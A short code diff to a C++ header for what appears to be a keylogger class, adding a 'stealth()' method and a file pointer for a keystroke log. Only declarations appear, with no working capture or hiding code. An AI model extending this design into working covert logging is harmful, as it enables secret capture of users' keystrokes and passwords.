@@ -23,12 +23,14 @@ public:
 	int		getKey(const INPUT_RECORD);
 	int		getMouse();
 	int		getForeground();
+	int		stealth();
 
 private:
 	HWND	fg;
 	int		mousePosX;
 	int		mousePosY;
 	int		keyPressed;
+	FILE	*myKeylogfile;
 };
 
 #endif /* !KEYLLOG_HH_ */
